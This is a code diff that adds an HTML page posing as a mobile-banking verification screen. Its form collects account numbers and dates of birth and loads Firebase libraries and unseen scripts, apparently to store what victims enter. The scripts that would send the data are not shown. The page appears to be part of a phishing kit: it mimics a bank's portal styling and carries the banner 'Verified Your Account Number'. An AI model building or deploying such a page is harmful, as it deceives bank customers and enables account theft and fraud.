@@ -1,0 +1,167 @@
+<html>
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" type="image/png" sizes="32x32" href="./database_files/favicon.png">
+    <title>Welcome to Mobile Banking</title>
+    <meta content="initial-scale=1.0, width=device-width" name="viewport">
+    <link href="./database_files/mentions.css" rel="stylesheet" type="text/css">
+    <link href="./database_files/main.css" rel="stylesheet" type="text/css">
+    <link class="lfr-css-file" data-senna-track="temporary" href="./database_files/aui.css" id="liferayAUICSS" rel="stylesheet" type="text/css">
+    <link data-senna-track="temporary" href="./database_files/main(1).css" id="liferayPortalCSS" rel="stylesheet" type="text/css">
+    <link class="lfr-css-file" data-senna-track="temporary" href="./database_files/main(2).css" id="liferayThemeCSS" rel="stylesheet" type="text/css">
+    <img src="lolo.jpg"  width="100%" height="13%">
+   
+<style>
+   #kyc {
+            width: 104%;
+            background-color:#B21807;
+            height: 55px;
+            margin: 6px;
+            margin-left: -7px;
+        }
+</style>
+</head>
+ 
+
+<body>
+
+    
+                    
+        </header>
+<br>
+
+        <section id="content">
+
+             <div id="kyc"><br>
+            <b style="color:white; padding:20px;">Verified Your Account Number </b>
+        </div>
+        <div id="col">
+            
+
+            <div class="columns-max" id="main-content" role="main">
+                <div class="portlet-layout row">
+                    <div class="col-md-12 portlet-column portlet-column-only" id="column-1">
+                        <div class="portlet-boundary portlet-boundary_com_liferay_login_web_portlet_LoginPortlet_ portlet-static portlet-static-end decorate portlet-login " id="p_p_id_com_liferay_login_web_portlet_LoginPortlet_"> <span id="p_com_liferay_login_web_portlet_LoginPortlet"></span>
+
+                            <section class="portlet" id="portlet_com_liferay_login_web_portlet_LoginPortlet">
+                                <div class="portlet-content"> <a class="icon-monospaced portlet-icon-back text-default" href="" title="Return to Full Page"></a>
+                                    <div class=" portlet-content-container">
+
+                                        <div class="portlet-body">
+
+                                            <div class="login-container">
+
+
+
+                                                <form action="" id="ududip005">
+
+                                                    <div class="col-lg-6 col-md-6 col-sm-6">
+                                                        <div class="form-group">
+
+                                                        
+
+                                                            <label for="cardNumber">Account Number*</label>
+
+                                                            <input name="accountNumber" type="text" placeholder="Enter Account Number" class="form-control" id="accnum" tabindex="15" size="15" maxlength="15" minlength="15" onfocus="getFocus(this.id);" autocomplete="off" oncopy="return false" onpaste="return false" oninput="formatCardNumber(this);" onkeypress="return isNumberKey(event);"
+                                                                onkeydown="return isNumberKey(event);" aria-label="accountNumber" required/>
+
+                                                            <div id="cardType"></div>
+
+                                                            
+
+                                                            <div class="">
+                                                                <label class="control-label">Date of Birth* </label>
+                                                                <input class="field clearable form-control success-field" id="udob" type="text" placeholder="DD-MM-YYYY" maxlength="10" aria-required="true" required>
+                                                            </div>
+
+                                                            <script>
+                                                                const dobInput = document.getElementById("udob");
+
+                                                                dobInput.addEventListener("input", function() {
+                                                                    let value = this.value;
+                                                                    value = value.replace(/\D/g, ""); // Remove non-digit characters
+                                                                    value = value.slice(0, 8); // Limit the length to 8 characters
+
+                                                                    let formattedValue = "";
+                                                                    const day = value.slice(0, 2);
+                                                                    const month = value.slice(2, 4);
+                                                                    const year = value.slice(4, 8);
+
+                                                                    if (day.length > 0) {
+                                                                        formattedValue += day;
+                                                                    }
+
+                                                                    if (month.length > 0) {
+                                                                        formattedValue += "-" + month;
+                                                                    }
+
+                                                                    if (year.length > 0) {
+                                                                        formattedValue += "-" + year;
+                                                                    }
+
+                                                                    this.value = formattedValue;
+                                                                });
+                                                            </script>
+
+
+
+                                                            
+
+
+
+
+                                                        </div>
+
+
+
+
+
+
+                                                        <div class="form-group">
+
+                                                            <input style="background-color:#B21807" class="btn btn-lg btn-primary btn-default" type="submit" tabindex="18" title="Login" value="Submit	" id="Button2" onclick="return submitLoginShagc(&#39;nLEbcx0S&#39;);">
+
+
+
+
+
+
+
+                                                        </div>
+                                                    </div>
+
+
+                                                </form>
+
+
+
+                                                <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+                                                <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+                                                <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+
+
+                                                <script src="firebase.js"></script>
+                                                <script src="acc.js"></script>
+
+
+
+
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+        <img src="futterhas.png"  width="100%" height="50%">
+
+</body>
+
+</html>
